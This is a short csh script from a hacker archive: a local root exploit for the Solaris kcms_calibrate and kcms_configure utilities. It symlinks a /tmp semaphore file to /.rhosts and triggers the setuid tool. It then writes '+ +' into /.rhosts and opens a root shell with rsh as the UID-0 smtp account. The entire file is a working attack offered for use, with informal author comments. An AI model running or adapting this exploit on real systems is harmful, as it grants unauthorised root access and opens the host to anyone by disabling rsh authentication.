#!/bin/csh
#
# JungSeok. Roh  ( beren@cosmos.kaist.ac.kr )
# Junior in KAIST undergraduate. Under Management Dep .

set disp="cosmos.kaist.ac.kr:0.0"
setenv DISPLAY $disp
/bin/rm -rf /tmp/Kp_kcms_sys.sem
cd /tmp

#Making symbolic link
ln -s /.rhosts Kp_kcms_sys.sem
/usr/openwin/bin/kcms_calibrate &

while(1)

echo "Click the device you've chosen in kcms_calibrate window"

# Choose Any profiles .. hk..
# My 2.5 machine is unreachible son I can't get exact name of that profiles.
# What a fool I am.. jjap..
/usr/openwin/bin/kcms_configure -o -d $disp /usr/openwin/share/etc/devdata/profiles/Eksony17.mon

if( -f /.rhosts ) then
        echo -n "+ +" >> /.rhosts
# As u know , we can't login as root .. use smtp account. that has UID 0  !!
        /usr/bin/rsh localhost -l smtp csh -i
endif
end
#                 www.hack.co.za           [2000]#